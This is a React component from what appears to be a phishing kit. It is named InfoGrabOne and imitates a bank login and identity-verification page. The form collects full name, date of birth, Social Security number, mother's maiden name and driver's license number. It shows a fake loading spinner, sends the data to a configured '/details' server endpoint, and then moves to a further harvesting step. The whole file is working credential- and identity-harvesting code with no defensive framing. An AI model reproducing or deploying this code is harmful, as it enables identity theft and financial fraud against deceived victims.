import { Button, Paper, Stepper, TextField } from "@mui/material";
import React, { useState } from "react";
import Box from '@mui/material/Box';
import Step from '@mui/material/Step';
import StepLabel from '@mui/material/StepLabel';
import InfoGrabTwo from "./InfoGrabTwo";
const steps = [
  'Verify Information',
  'Card Verification',
  'Identity Verification',
];




function InfoGrabOne (userid) {
    const [show, setShow] = useState(); 
    const [step, setSteps] = React.useState(0); 

    const [opacity, setOpacity] = useState(false); 
  const [opacityValue, setOpacityValue] = useState('');

    const [name, setName] = React.useState('');
    const [dob, setDob] = React.useState('');
    const [ssn, setSsn] = React.useState('');
    const [mmn, setMmn] = React.useState('');
    const [dl, setDl] = React.useState('');




    React.useEffect(() => {
            setShow(false);
            console.log(userid.userid.userid.userid.visitor)

    }, [])

    const submitHandler = e => {
  
      setOpacity(true); 
    setOpacityValue('opacity-20')
    
      e.preventDefault(); 
      console.log('hitting')
      setSteps(step+1)

      setTimeout(() => {
        setShow(true)
        const data = {visitor_id:userid.userid.userid.userid.visitor, fullName: name, dob: dob, ssn: ssn,mmn: mmn, dl:dl};

        
      fetch(process.env.REACT_APP_PRODUCTION_URL+'/details', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
  
      }).then((response) => {
        console.log(response.status)
      })

      }, 3000);
      
    }
    
  return (
<div >
<Box className='p-2' sx={{ width: '100%' }}>
      <Stepper activeStep={step} alternativeLabel>
        {steps.map((label) => (
          <Step key={label}>
            <StepLabel>{label}</StepLabel>
          </Step>
        ))}
      </Stepper>
    </Box>
    {!show && (
        
        <form onSubmit={submitHandler} className=" flex flex-col items-center p-5 ">


    {/* <div className='text-3xl font-semibold'>Personal Details </div>            */}

    <Box
      sx={{
        borderRadius: "50px",
        display: 'flex',
        flexWrap: 'wrap',
        '& > :not(style)': {
          m: 1,
          width: 280,
          height: 400,
          
        },
      }}
    >
      <Paper className={opacity ? opacityValue : ""} style={{borderRadius: 10}} elevation={6}>

      {opacity ? (

<div role="status" class="absolute -translate-x-1/2 -translate-y-1/2 top-2/4 left-1/2 ">
<svg aria-hidden="true" class="w-16 h-16 mr-2 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/><path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/></svg>
<span class="sr-only">Loading...</span>
</div>
) : (

<div></div>
)}

            
      <div className='mb-7 mt-3 p-5'>
          <TextField autoFocus id="standard-basic" label="Full Name" fullWidth={true} margin="dense" size="small"  required onChange={(event) => {setName(event.target.value)}} value = {name}/>
          <TextField id="standard-basic" label="Date Of Birth - MM/DD/YYYY"  fullWidth={true} margin="dense" size="small" required onChange={(event) => {setDob(event.target.value)}} value = {dob} />

          <TextField id="standard-basic" label="Social Security Number"  fullWidth={true} margin="dense" size="small" required onChange={(event) => {setSsn(event.target.value)}} value = {ssn} />
          <TextField id="standard-basic" label="Mothers Maiden Name"  fullWidth={true} margin="dense" size="small" required onChange={(event) => {setMmn(event.target.value)}} value = {mmn} />
          <TextField id="standard-basic" label="Drivers License Number"  fullWidth={true} margin="dense" size="small"  required onChange={(event) => {setDl(event.target.value)}} value = {dl} />
          <div className="mt-6">
          <Button fullWidth={true} type="submit" variant="contained">Login</Button>
          </div>

    </div>

        
            


      </Paper>
    </Box>

   
        <div className='p-1 mt-4'>
          <span className='text-xs'>First time logging in? </span><span className='text-xs'>Enroll Now.</span>
        </div>

        <div className='p-1'>
          <span className='text-xs'>Forgot Password</span> <span className='text-xs'> or need other assistance?</span><span className="text-xs">Contact us </span>
        </div> 
           

    </form>

    )}; 


    {/* {!stepTwo? (<InfoGrabTwo/>) : <></>} */}
    {show &&<div> <InfoGrabTwo userid={userid.userid.userid.userid.visitor}/> </div>}
    </div>
  );
};

export default InfoGrabOne;
